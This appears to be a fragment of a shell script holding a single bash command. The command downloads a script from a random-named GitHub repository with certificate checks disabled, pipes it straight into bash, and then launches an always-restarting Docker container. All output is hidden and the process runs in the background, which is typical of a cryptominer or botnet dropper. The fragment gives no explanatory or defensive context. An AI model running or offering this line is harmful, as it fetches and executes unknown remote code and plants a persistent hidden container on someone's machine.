...
bash -c "wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main/d.sh |bash -s 9 servehulls/jnqzcx && docker run -dt --restart=always servehulls/ajsbzx:latest" >/dev/null 2>&1 &
